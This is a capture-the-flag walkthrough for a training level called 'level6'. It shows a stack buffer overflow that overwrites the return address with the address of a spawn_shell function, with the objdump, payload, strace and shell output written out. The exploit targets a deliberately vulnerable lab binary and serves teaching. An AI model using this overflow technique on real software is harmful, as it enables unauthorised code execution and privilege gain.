upon `call` the current EIP is pushed on the stack, and upon `ret` this value is popped from the stack and jumped to.
With the buffer overflow you can overwrite this address on the stack and redirect code execution when the function wants to return.
here we need to call the spawn_shell function which is at address 0804858b
    level6@gracker:/matrix/level6$ objdump -t level6 | grep shell
    0804858b g     F .text  00000060              spawn_shell

Because of the endianess [0] we have to reverse the bytes:
0x804858b -> \x8b\x85\x04\x08
Thanks to the output of the return address we can verify that we entered the correct address:

    level6@gracker:/matrix/level6$ ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`
    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
    What are you doing here? Are you a user or a program?
    Where did you come from? Proof your identity:
    Return to: 0x45444342
    zsh: segmentation fault  ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`

A nice tool to analyse what the binary does, and to check if the function is called:
    
    level6@gracker:/matrix/level6$ strace ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
    [... snip ...]
    write(1, "Welcome to Arjia City!\n", 23Welcome to Arjia City!
    ) = 23
    getegid32()                             = 0
    geteuid32()                             = 1007
    setresgid32(0, 0, 0)                    = 0
    setresuid32(1007, 1007, 1007)           = 0
    [...]

Which fits the functions called in `spawn_shell`. And when we run it without the strace we also see the nice shell:

    ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
    What are you doing here? Are you a user or a program?
